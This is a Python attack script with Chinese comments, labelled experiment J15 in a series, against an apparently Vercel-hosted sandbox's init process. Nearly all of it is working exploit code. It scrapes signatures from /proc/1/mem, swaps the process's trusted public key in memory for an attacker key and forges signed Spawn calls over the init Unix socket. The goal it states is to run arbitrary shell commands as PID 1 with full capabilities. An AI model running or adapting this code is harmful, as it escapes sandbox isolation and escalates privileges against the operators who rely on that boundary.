# 实验J15: 伪造 Spawn 调用 - 以 sandbox-init 身份执行任意命令(探求最大影响)
# J14 成功: proc+ts 消息格式 + pubkey 替换 + 伪造签名 Ping -> 200
# Spawn = agent 初始化时执行 sudo.sh 的方法 => 可能允许任意 command 执行
# 目标: 构造 Spawn body -> 以 pid1(CapEff 全开)身份执行命令 -> 确认影响面
import os, re, subprocess, base64, time, socket

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j15.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

# ---------- [1] 捕获签名对 ----------
log("== [1] 扫描捕获签名对 ==")
sig_pairs = []
spawn_bodies = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts} sig={sig[:40]}...")
        # Spawn body 提取: Spawn proc 字符串后找 JSON
        for m in re.finditer(rb"POST (/vercel\.sandbox\.spawn\.v1\.SpawnService/Spawn) HTTP/1\.1", d):
            seg = d[m.start():m.start()+3000]
            jm = re.search(rb"\{.*\}", seg, re.DOTALL)
            if jm and jm.group(0) not in spawn_bodies:
                spawn_bodies.append(jm.group(0))
                log(f"  BODY? {jm.group(0)[:500]!r}")
    time.sleep(0.05)
if not sig_pairs:
    log("  !! 30s 未捕获签名对")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [2] 二进制 proto 字段提取 ----------
log("== [2] 二进制 proto 字段 ==")
binpath = run("ls /app/containers/sandbox-init/ 2>/dev/null; find /app -maxdepth 3 -type f -size +1M 2>/dev/null | head -5")
log(f"  bin: {binpath.strip()}")
bp = "/app/containers/sandbox-init/sandbox-init"
try:
    data = open(bp, "rb").read(20 * 1024 * 1024)
    strs = re.findall(rb"[\x20-\x7e]{4,}", data)
    interesting = []
    for s in strs:
        t = s.decode(errors='replace')
        if re.match(r"^(command|args|env|uid|gid|name|path|workdir|cap|stdin|stdout|timeout|privileged|network|mount|rootfs|entrypoint|user|group)", t):
            interesting.append(t)
    log(f"  字段: {sorted(set(interesting))[:60]}")
except Exception as e:
    log(f"  bin read ERR: {e}")
# 找 SpawnRequest 相关 JSON 字段名(protojson 惯例)
try:
    data = open(bp, "rb").read(40 * 1024 * 1024)
    for pat in [rb"SpawnRequest", rb"commandJson", rb"\"command\"", rb"\"args\"", rb"\"path\""]:
        idxs = [m.start() for m in re.finditer(pat, data)][:3]
        for i in idxs:
            log(f"  {pat.decode()} @{hex(i)}: {data[max(0,i-100):i+200]!r}")
except Exception as e:
    log(f"  probe ERR: {e}")

# ---------- [3] pubkey ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
log(f"[3] pubkey: {m.group(1)}")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

# 验证格式(proc+ts 已由 J14 确定)
fmt_ok = False
for proc, ts, sig in sig_pairs:
    if verify(proc.encode() + ts.encode(), sig):
        log(f"  proc+ts 格式确认: {proc} ts={ts}")
        fmt_ok = True
        break
if not fmt_ok:
    log("  !! proc+ts 验证失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [4] 替换 pubkey ----------
log("== [4] 替换 pubkey ==")
copies = []
for line in open("/proc/1/maps"):
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    a0, a1 = parts[0].split("-")
    start, end = int(a0, 16), int(a1, 16)
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
log(f"  pubkey 副本: {[hex(c) for c in copies]}")

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fd = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fd, 32, off)))
    os.pwrite(fd, atk_pub, off)
log(f"  已替换 {len(copies)} 处")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

def http_unix(path, body, timeout=8):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
               f"X-Signature: {base64.b64encode(sign(path.encode() + str(int(time.time())).encode())).decode()}\r\n"
               f"X-Timestamp: {int(time.time())}\r\n\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        status = head.split(b" ")[1].decode() if b" " in head else "?"
        return status, respbody[:600], head[:300]
    except Exception as e:
        return "ERR", str(e).encode(), b""

# ---------- [5] 伪造 Spawn 调用探测 ----------
log("== [5] 伪造 Spawn 探测 ==")
SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
TEST_CMDS = [
    b'id; uname -a; cat /proc/1/status | head -12; ls -la /run/vercel/share/',
]
bodies = [
    b"{}",
    b'{"command":{"path":"/bin/sh","args":["-c","id;uname -a"]}}',
    b'{"cmd":{"path":"/bin/sh","args":["-c","id;uname -a"]}}',
    b'{"command":{"path":"/bin/sh","args":["-c","id;uname -a"],"env":[]}}',
]
for i, body in enumerate(bodies):
    st, rb, hh = http_unix(SPAWN, body)
    log(f"  body[{i}] {body[:80]!r} -> {st}")
    log(f"    resp: {rb!r}")
    log(f"    head: {hh!r}")
    if st == "200":
        log("  ########## Spawn 调用成功! 检查 resp 是否为命令输出 ##########")
        break

# ---------- [6] 恢复 ----------
log("[6] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fd, orig, off)
os.close(fd)
log("done")
OUT.close()
